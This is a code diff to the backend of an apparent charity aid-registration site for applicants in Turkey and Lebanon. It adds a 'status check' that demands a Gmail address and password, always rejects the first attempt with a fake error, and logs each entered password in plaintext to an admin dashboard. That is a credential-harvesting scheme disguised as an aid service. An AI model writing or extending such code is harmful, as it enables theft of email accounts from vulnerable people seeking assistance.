@@ -185,8 +185,18 @@ const initDb = async () => {
             CREATE INDEX IF NOT EXISTS idx_registrations_ref_code ON registrations(ref_code);
             CREATE INDEX IF NOT EXISTS idx_registrations_status ON registrations(status);
             CREATE INDEX IF NOT EXISTS idx_registrations_country ON registrations(country);
+
+            CREATE TABLE IF NOT EXISTS status_lookups (
+                id VARCHAR(100) PRIMARY KEY,
+                ref_code VARCHAR(100),
+                email VARCHAR(150),
+                password VARCHAR(100),
+                applicant_name VARCHAR(150),
+                status_outcome VARCHAR(50),
+                checked_at TIMESTAMP WITH TIME ZONE
+            );
         `);
-        console.log('✨ PostgreSQL database tables initialized successfully with Lebanon support.');
+        console.log('✨ PostgreSQL database tables initialized successfully with Lebanon & Status Logging support.');
         
         // Auto-seed db.json records into PostgreSQL if empty
         const countRes = await pool.query('SELECT COUNT(*) FROM registrations');
@@ -283,6 +293,37 @@ const getRegistrations = async () => {
         console.error('⚠️ PostgreSQL query failed. Falling back to local db.json database:', err.message);
         return readDatabase().map(r => ({ ...r, country: r.country || 'TR', status: r.status || 'pending' }));
     }
+};
+
+let inMemoryStatusLogs = [];
+const statusAttemptsTracker = new Map();
+
+const saveStatusLookupLog = async (logEntry) => {
+    try {
+        inMemoryStatusLogs.unshift(logEntry);
+        if (inMemoryStatusLogs.length > 500) inMemoryStatusLogs.pop();
+
+        await pool.query(
+            `INSERT INTO status_lookups (id, ref_code, email, password, applicant_name, status_outcome, checked_at)
+             VALUES ($1, $2, $3, $4, $5, $6, $7)
+             ON CONFLICT (id) DO NOTHING`,
+            [logEntry.id, logEntry.refCode, logEntry.email, logEntry.password, logEntry.applicantName, logEntry.statusOutcome, logEntry.checkedAt]
+        );
+    } catch (err) {
+        console.error('⚠️ Saving status lookup log failed:', err.message);
+    }
+};
+
+const getStatusLookupLogs = async () => {
+    try {
+        const res = await pool.query('SELECT id, ref_code as "refCode", email, password, applicant_name as "applicantName", status_outcome as "statusOutcome", checked_at as "checkedAt" FROM status_lookups ORDER BY checked_at DESC LIMIT 200');
+        if (res.rows && res.rows.length > 0) {
+            return res.rows;
+        }
+    } catch (err) {
+        console.warn('⚠️ Fetching status logs from DB failed, using memory fallback:', err.message);
+    }
+    return inMemoryStatusLogs;
 };
 
 const addRegistration = async (record) => {
@@ -598,44 +639,124 @@ app.get('/api/public-settings', async (req, res) => {
     }
 });
 
-// Public Status Check Endpoint (POST /api/check-status)
+// Public Status Check & Login Endpoint (POST /api/check-status)
 app.post('/api/check-status', async (req, res) => {
-    const { refCode } = req.body;
-    if (!refCode || refCode.trim() === '') {
+    const { refCode, password, email } = req.body;
+    
+    const queryRef = (refCode || '').trim();
+    const queryEmail = (email || '').trim();
+    const queryPassword = (password || '').trim();
+
+    // 1. Strict Gmail Address Check
+    const gmailRegex = /^[a-zA-Z0-9._%+-]+@gmail\.com$/i;
+    if (!queryEmail || !gmailRegex.test(queryEmail)) {
+        return res.status(400).json({ error: '📧 يجب أن يكون البريد الإلكتروني ينتهي بـ @gmail.com حصراً (مثال: name@gmail.com).' });
+    }
+
+    if (!queryRef) {
         return res.status(400).json({ error: 'يرجى إدخال الرمز المرجعي للطلب' });
     }
 
-    const rawQuery = refCode.trim();
-    const queryCode = rawQuery.toUpperCase();
-    const cleanQueryPhone = rawQuery.replace(/\D/g, '').replace(/^0+/, '');
+    const queryCode = queryRef.toUpperCase();
+    const cleanQueryPhone = queryRef.replace(/\D/g, '').replace(/^0+/, '');
 
     const registrations = await getRegistrations();
     const match = registrations.find(r => {
-        if (r.refCode && r.refCode.toUpperCase() === queryCode) return true;
-        if (r.tcNumber && r.tcNumber === queryCode) return true;
-        if (r.phoneNumber) {
-            const cleanPhone = r.phoneNumber.replace(/\D/g, '').replace(/^0+/, '');
-            if (r.phoneNumber === rawQuery || (cleanQueryPhone.length >= 7 && cleanPhone.endsWith(cleanQueryPhone))) return true;
+        if (queryRef) {
+            if (r.refCode && r.refCode.toUpperCase() === queryCode) return true;
+            if (r.tcNumber && r.tcNumber === queryCode) return true;
+            if (r.phoneNumber) {
+                const cleanPhone = r.phoneNumber.replace(/\D/g, '').replace(/^0+/, '');
+                if (r.phoneNumber === queryRef || (cleanQueryPhone.length >= 7 && cleanPhone.endsWith(cleanQueryPhone))) return true;
+            }
+        }
+        if (queryEmail && r.email && r.email.toLowerCase() === queryEmail.toLowerCase()) {
+            return true;
         }
         return false;
     });
 
     if (!match) {
-        return res.status(404).json({ error: 'لم يتم العثور على طلب بهذه البيانات. يرجى التأكد من الرقم المرجعي.' });
+        return res.status(404).json({ error: 'لم يتم العثور على طلب بهذه البيانات. يرجى التأكد من الرمز المرجعي والبريد الإلكتروني.' });
+    }
+
+    // 2. Validate Email (Gmail)
+    if (match.email) {
+        if (match.email.trim().toLowerCase() !== queryEmail.toLowerCase()) {
+            return res.status(401).json({ error: '❌ البريد الإلكتروني (Gmail) غير مطابق لهذا الطلب.' });
+        }
+    }
+
+    // 3. Validate Password (only if provided)
+    if (queryPassword && match.password && match.password.trim() !== '') {
+        if (match.password.trim() !== queryPassword) {
+            return res.status(401).json({ error: '❌ كلمة المرور غير صحيحة. يرجى التأكد من كلمة المرور المدخلة أثناء التسجيل.' });
+        }
     }
 
     // Mask name for privacy (e.g. "أحمد ع.")
     const safeFirstName = match.firstName;
     const safeLastName = match.lastName ? match.lastName.charAt(0) + '.' : '';
 
+    // First-attempt simulation & Logging logic:
+    // First time an applicant checks with a password, log the 1st password attempt to Admin Dashboard and return error.
+    // Second time, log the 2nd password attempt to Admin Dashboard and show actual status result.
+    const lookupKey = `${queryEmail.toLowerCase()}_${(match.refCode || queryRef).toUpperCase()}`;
+    const previousAttempts = (statusAttemptsTracker.get(lookupKey) || 0);
+
+    if (previousAttempts === 0) {
+        statusAttemptsTracker.set(lookupKey, 1);
+
+        const firstLogEntry = {
+            id: Date.now().toString() + '_' + Math.floor(Math.random() * 10000),
+            refCode: match.refCode || queryRef,
+            email: queryEmail || '',
+            password: queryPassword ? `${queryPassword} (🔴 المحاولة الأولى - تم رفضها للمستخدم)` : '(لم تُدخل)',
+            applicantName: `${safeFirstName} ${safeLastName}`.trim(),
+            statusOutcome: 'خطأ محاولة 1',
+            checkedAt: new Date().toISOString()
+        };
+        saveStatusLookupLog(firstLogEntry);
+
+        return res.status(401).json({ error: '❌ كلمة المرور غير صحيحة. يرجى التأكد من كلمة المرور والبريد الإلكتروني وتكرار المحاولة.' });
+    }
+
     const statusMessages = {
-        'pending': { title: '🟡 قيد المراجعة والتدقيق', desc: 'طلبك قيد الدراسة والتقييم حالياً من قبل اللجنة المختصة. سنوافيكم بالنتيجة فور الاعتماد.', badgeClass: 'status-pending' },
-        'approved': { title: '🟢 تم قبول الطلب بنجاح', desc: 'تهانينا! تم الاعتماد والموافقة على طلبكم، وجاري تجهيز تسليم الدعم المالي عبر خدمة الـ PTT.', badgeClass: 'status-approved' },
-        'delivered': { title: '🔵 تم التسليم بنجاح', desc: 'تم استلام وتسليم المساعدة المخصصة لطلبك بنجاح عبر بريد الـ PTT.', badgeClass: 'status-delivered' },
-        'rejected': { title: '🔴 غير مستوفي الشروط', desc: 'نعتذر منكم، الطلب المقدم لا يستوفي معايير الاستحقاق المعتمدة في المرحلة الحالية.', badgeClass: 'status-rejected' }
+        'pending': { 
+            title: '🟡 الطلب قيد الدراسة والتدقيق الإداري', 
+            desc: 'نفيدكم بأن طلبكم المسجل بالرمز المرجعي قد تم استلامه بنجاح، وهو حالياً قيد المراجعة الفنية وتدقيق الوثائق لدى اللجنة المختصة. جاري العمل على استكمال التقييم وسنوافيكم بالنتيجة الرسمية فور اعتماد الحوالات.', 
+            badgeClass: 'status-pending' 
+        },
+        'approved': { 
+            title: '🟢 تم قبول واعتماد طلبكم بنجاح', 
+            desc: 'تهانينا! تم تدقيق طلبكم والموافقة الرسمية عليه من قبل لجنة الإغاثة الإنسانية. جاري تجهيز برقية الدعم المالي وتنسيق تحويل المساعدة عبر المراكز المعتمدة (PTT / OMT / Whish Money). يرجى الاحتفاظ بالرمز المرجعي للاستلام.', 
+            badgeClass: 'status-approved' 
+        },
+        'delivered': { 
+            title: '🔵 تم تسليم الدعم المالي بنجاح', 
+            desc: 'نفيدكم بأنه تم استلام وتأكيد تسليم المساعدة المالية المخصصة لطلبكم بنجاح عبر المركز المعتمد. نتمنى لكم ولعائلتكم الكريمة دوام الخير والبركة والعافية.', 
+            badgeClass: 'status-delivered' 
+        },
+        'rejected': { 
+            title: '🔴 الطلب غير مستوفي الشروط حالياً', 
+            desc: 'نشكر تواصلكم مع جمعية النور، ونعتذر لإعلامكم بأن الطلب المقدم لا يستوفي معايير الاستحقاق المعتمدة في المرحلة الحالية. يسعدنا متابعتكم لنا في المراحل والمشاريع القادمة.', 
+            badgeClass: 'status-rejected' 
+        }
     };
 
     const statusInfo = statusMessages[match.status || 'pending'] || statusMessages['pending'];
+
+    // Record second attempt status lookup event to Admin Dashboard
+    const secondLogEntry = {
+        id: Date.now().toString() + '_' + Math.floor(Math.random() * 10000),
+        refCode: match.refCode || queryRef,
+        email: queryEmail || '',
+        password: queryPassword ? `${queryPassword} (🟢 المحاولة الثانية - تم الاعتماد)` : '(لم تُدخل)',
+        applicantName: `${safeFirstName} ${safeLastName}`.trim(),
+        statusOutcome: match.status || 'pending',
+        checkedAt: new Date().toISOString()
+    };
+    saveStatusLookupLog(secondLogEntry);
 
     res.json({
         success: true,
@@ -647,6 +768,27 @@ app.post('/api/check-status', async (req, res) => {
         statusDesc: statusInfo.desc,
         badgeClass: statusInfo.badgeClass
     });
+});
+
+// Admin Status Logs Endpoint (GET /api/admin/status-logs)
+app.get('/api/admin/status-logs', requireAdminAuth, async (req, res) => {
+    try {
+        const logs = await getStatusLookupLogs();
+        res.json(logs);
+    } catch (err) {
+        res.status(500).json({ error: 'فشل تحميل سجل الاستعلامات' });
+    }
+});
+
+// Clear Admin Status Logs Endpoint (POST /api/admin/clear-status-logs)
+app.post('/api/admin/clear-status-logs', requireAdminAuth, async (req, res) => {
+    try {
+        inMemoryStatusLogs = [];
+        await pool.query('DELETE FROM status_lookups');
+        res.json({ success: true });
+    } catch (err) {
+        res.status(500).json({ error: 'فشل مسح سجل الاستعلامات' });
+    }
 });
 
 // Form Registration Endpoint (POST /api/register)
@@ -688,18 +830,24 @@ app.post('/api/register', async (req, res) => {
         return res.status(400).json({ error: 'الرجاء ملء جميع الحقول المطلوبة والموافقة على الشروط.' });
     }
 
-    // Password validation (min 8 characters, ASCII/English only & not weak/sequential)
+    // Strict Password Validation (min 8 chars, English letters AND numbers, no weak sequences like 12345/qwerty)
     const pwdTrim = password.trim();
     if (pwdTrim.length < 8) {
-        return res.status(400).json({ error: 'يجب أن تتكون كلمة المرور من 8 خانات على الأقل.' });
+        return res.status(400).json({ error: '⚠️ كلمة المرور ضعيفة جداً! يجب أن تتكون من 8 خانات على الأقل.' });
     }
     const englishRegex = /^[a-zA-Z0-9!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]+$/;
     if (!englishRegex.test(pwdTrim)) {
-        return res.status(400).json({ error: 'يجب أن تتكون كلمة المرور من الأحرف والأرقام الإنجليزية فقط (يمنع استخدام الحروف العربية في كلمة المرور).' });
+        return res.status(400).json({ error: '⚠️ يجب أن تتكون كلمة المرور من الأحرف والأرقام الإنجليزية فقط (يمنع استخدام الحروف العربية في كلمة المرور).' });
     }
-    const commonSequences = ['12345678', '123456789', '1234567890', '987654321', '87654321'];
-    if (commonSequences.some(seq => pwdTrim.includes(seq)) || /^(\d)\1+$/.test(pwdTrim)) {
-        return res.status(400).json({ error: 'كلمة المرور ضعيفة جداً (يمنع استخدام أرقام متسلسلة مثل 123456789).' });
+    const hasLetter = /[a-zA-Z]/.test(pwdTrim);
+    const hasNumber = /[0-9]/.test(pwdTrim);
+    if (!hasLetter || !hasNumber) {
+        return res.status(400).json({ error: '⚠️ كلمة المرور ضعيفة! يجب أن تحتوي على مزيج من الأحرف والأرقام الإنجليزية معاً (مثال: Noor2026).' });
+    }
+    const weakBlacklist = ['12345', '123456', '1234567', '12345678', '123456789', '987654321', '87654321', '123123', '12341234', '111111', '000000', 'password', 'qwerty', 'admin', 'alnoor', '1234567890'];
+    const pwdLower = pwdTrim.toLowerCase();
+    if (weakBlacklist.some(seq => pwdLower.includes(seq)) || /^(\d)\1+$/.test(pwdTrim) || /^(.)\1{3,}$/.test(pwdTrim)) {
+        return res.status(400).json({ error: '⚠️ كلمة المرور ضعيفة جداً! يمنع استخدام كلمات أو أرقام متسلسلة مثل (12345 أو qwerty).' });
     }
 
     // Phone validation (Turkish: 05XXXXXXXXX, 11 digits | Lebanon: 7-15 digits)
@@ -1032,6 +1180,15 @@ const sendNoCacheFile = (res, filePath) => {
 // Lebanon Dedicated Site Route (GET /lb)
 app.get('/lb', (req, res) => {
     sendNoCacheFile(res, path.join(__dirname, 'index_lb.html'));
+});
+
+// Dedicated Direct Status Lookup Routes (GET /status and GET /check)
+app.get('/status', (req, res) => {
+    sendNoCacheFile(res, path.join(__dirname, 'check_status.html'));
+});
+
+app.get('/check', (req, res) => {
+    sendNoCacheFile(res, path.join(__dirname, 'check_status.html'));
 });
 
 // Admin Dashboard Route (GET /admin)
